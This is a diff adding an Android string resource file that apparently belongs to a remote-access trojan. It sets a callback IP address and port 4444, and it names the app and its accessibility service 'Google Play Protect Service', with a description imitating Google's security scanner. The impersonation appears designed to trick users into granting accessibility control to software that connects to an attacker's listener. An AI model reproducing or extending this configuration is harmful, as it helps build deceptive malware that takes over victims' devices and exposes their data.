@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="ip_address">192.168.0.129</string>
+    <string name="port_number">4444</string>
+
+    <string name="app_name">Google Play Protect Service</string>
+    <string name="accessibility_service_label">Google Play Protect Service</string>
+	<string name="accessibility_service_description">play protect regularly checks your apps and device for harmful behavior. You will be notified of any security risks found.</string>
+</resources>
